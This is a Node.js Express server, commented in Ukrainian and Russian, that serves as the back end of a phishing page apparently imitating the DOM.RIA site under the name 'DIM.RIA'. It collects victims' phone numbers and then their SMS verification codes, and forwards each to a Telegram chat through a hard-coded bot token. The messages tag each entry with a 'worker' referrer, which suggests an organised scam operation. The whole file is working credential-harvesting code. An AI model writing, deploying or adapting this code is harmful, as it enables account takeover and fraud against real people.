const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
const CHAT_ID = "-5055127448";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;  // ← Исправлено: BOT_TOKEN
// ==============================

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '/')));

// === МАРШРУТ ДЛЯ ПАНЕЛІ ===
app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Функція відправки в Telegram
async function sendToTelegram(message) {
    const params = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    try {
        const response = await fetch(TELEGRAM_API, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(params)
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Помилка Telegram API:', errorData);
            return false;
        }
        return true;
    } catch (error) {
        console.error('Помилка відправки:', error);
        return false;
    }
}

// === ОБРОБКА ДАНИХ З ФОРМИ ===
app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, referrer } = req.body;

    let message = '';

    if (step === 'phone' && phone) {
        message = `*ПРОЕКТ:* DIM.RIA ⚡⚡⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Украина`;
        if (referrer) message += `\n*Работник:* @${referrer}`;
    } 
    else if (step === 'code' && code) {
        message = `*SMS:*\n\`${code}\``;
        if (referrer) message += `\n*Работник:* @${referrer}`;
    } 
    else {
        return res.status(400).json({ success: false, message: 'Невірні дані' });
    }

    const success = await sendToTelegram(message);

    if (success) {
        res.json({ success: true });
    } else {
        res.status(500).json({ success: false, message: 'Помилка сервера' });
    }
});

// Запуск
app.listen(port, () => {
    console.log(`Сервер запущено: http://localhost:${port}`);
});
